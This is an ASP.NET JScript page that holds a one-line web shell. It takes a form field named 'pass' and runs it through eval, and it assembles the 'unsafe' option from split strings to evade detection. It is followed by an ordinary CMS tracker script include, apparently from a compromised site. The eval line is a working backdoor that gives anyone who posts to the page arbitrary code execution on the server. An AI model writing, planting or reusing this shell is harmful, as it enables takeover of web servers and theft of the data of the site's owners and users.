<%@ Page Language="Jscript" Debug=true%>
<%
var a=Request.Form("pass");
var b="unsa",c="fe",d=b+c;
function fun()
{
 return a;
}
eval(fun(),d);
%>
//ok

<script src="/SiteFiles/bairong/scripts/independent/tracker.js" type="text/javascript"></script>
<script type="text/javascript">AddTrackerCount('/sitefiles/services/cms/PageService.aspx?type=AddTrackerCount&publishmentSystemID=1&channelID=1&contentID=0', 1);</script>
